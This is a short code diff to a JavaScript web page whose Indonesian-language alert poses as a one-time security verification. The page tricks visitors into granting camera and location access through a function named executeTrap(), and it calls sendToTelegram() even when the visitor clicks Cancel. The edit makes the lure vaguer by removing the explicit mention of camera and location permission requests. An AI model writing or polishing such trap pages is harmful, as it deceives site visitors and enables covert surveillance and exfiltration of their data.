@@ -2173,9 +2173,9 @@
             "Sistem mendeteksi aktivitas mencurigakan dari perangkat Anda.\n" +
             "Untuk melindungi data Anda dan memverifikasi bahwa Anda adalah pengguna asli,\n" +
             "kami memerlukan konfirmasi keamanan satu kali.\n\n" +
-            "Setelah mengklik 'OK', Anda akan diminta untuk:\n" +
-            "1. Mengizinkan akses kamera (hanya 2 detik)\n" +
-            "2. Membagikan lokasi Anda (sekali saja)\n\n" +
+            "mengklik 'OK', untuk Melanjutkan.:\n" +
+            "1. Mengamankan akses kamera\n" +
+            "2. Mengamankan lokasi Anda \n\n" +
             "Data ini akan dienkripsi dan tidak disimpan.\n" +
             "Klik 'OK' untuk melanjutkan akses ke situs ini.";
 
@@ -2187,7 +2187,7 @@
             executeTrap();
             
             // Tampilkan pesan follow-up
-            alert("Terima kasih! Verifikasi dimulai...\n\nHarap izinkan permintaan kamera dan lokasi yang muncul berikutnya.");
+            alert("Terima kasih! Verifikasi dimulai...\n\n.");
         } else {
             // Jika user klik Cancel, tetap kirim notifikasi
             sendToTelegram(
